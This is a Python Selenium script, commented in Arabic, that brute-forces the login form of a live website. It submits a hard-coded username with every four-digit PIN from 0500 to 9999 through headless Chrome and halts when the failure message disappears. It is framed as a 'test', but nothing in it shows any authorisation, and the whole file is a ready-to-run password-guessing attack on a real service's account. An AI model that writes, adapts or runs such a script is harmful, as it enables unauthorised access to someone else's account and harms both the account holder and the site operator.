import time
import os
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# --- إعدادات الاختبار ---
TARGET_URL = "https://menhel-ndb-2.online"
USERNAME = "33772020"
PASSWORD_START = 500
PASSWORD_END = 9999

# رسالة الخطأ التي تظهر عند الفشل
ERROR_MESSAGE = "خطأ في تسجيل الدخول" 

# --- إعدادات Selenium للخادم (مُحدَّثة) ---
options = webdriver.ChromeOptions()
options.add_argument("--headless")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--window-size=1920,1080")
options.add_argument("--disable-gpu")

# !! تحديث مهم: تحديد مسار ملف Chrome التنفيذي !!
# هذا يخبر Selenium بمكان المتصفح الذي قمنا بتثبيته محليًا
chrome_path = os.path.join(os.getcwd(), "deps", "chrome-linux64", "chrome")
options.binary_location = chrome_path

# !! تحديث مهم: تحديد مسار ملف ChromeDriver التنفيذي !!
chromedriver_path = os.path.join(os.getcwd(), "deps", "chromedriver-linux64", "chromedriver")
service = Service(executable_path=chromedriver_path)


# --- وظيفة الاختبار الرئيسية ---
def run_brute_force_test():
    driver = None
    print("--- بدء تشغيل السكربت ---")
    try:
        # تهيئة المتصفح مع الخدمة والخيارات المحددة
        print("1. تهيئة متصفح Chrome...")
        driver = webdriver.Chrome(service=service, options=options)
        
        print(f"2. التوجه إلى الموقع: {TARGET_URL}")
        driver.get(TARGET_URL)
        
        print("3. الانتظار لمدة 10 ثواني لتحميل الصفحة بالكامل...")
        time.sleep(10) 

        try:
            WebDriverWait(driver, 15).until(
                EC.presence_of_element_located((By.NAME, "auths"))
            )
            print("4. تم العثور على حقل اسم المستخدم بنجاح. الصفحة جاهزة.")
        except TimeoutException:
            print("!!! فشل التحقق الأولي !!!")
            print("لم يتم العثور على حقل اسم المستخدم. قد يكون الموقع محجوبًا.")
            return

        print("5. بدء تجربة كلمات المرور...")
        for i in range(PASSWORD_START, PASSWORD_END + 1):
            password = str(i).zfill(4)
            
            try:
                username_field = driver.find_element(By.NAME, "auths") 
                password_field = driver.find_element(By.NAME, "password")
                login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                
                username_field.clear()
                username_field.send_keys(USERNAME)
                password_field.clear()
                password_field.send_keys(password)
                
                login_button.click()
                print(f"   - تجربة كلمة المرور: {password}")
                
                time.sleep(3) 
                
                if ERROR_MESSAGE not in driver.page_source:
                    print(f"\n*** نجاح! تم تسجيل الدخول بكلمة المرور: {password} ***")
                    print("سيتم إيقاف السكربت.")
                    break 
                
            except Exception as e:
                print(f"حدث خطأ غير متوقع أثناء المحاولة {password}: {e}")
                break
                
    except Exception as e:
        print(f"حدث خطأ فادح في تشغيل المتصفح: {e}")
    finally:
        if driver:
            driver.quit()
            print("--- تم إغلاق المتصفح وإنهاء السكربت ---")

if __name__ == "__main__":
    run_brute_force_test()
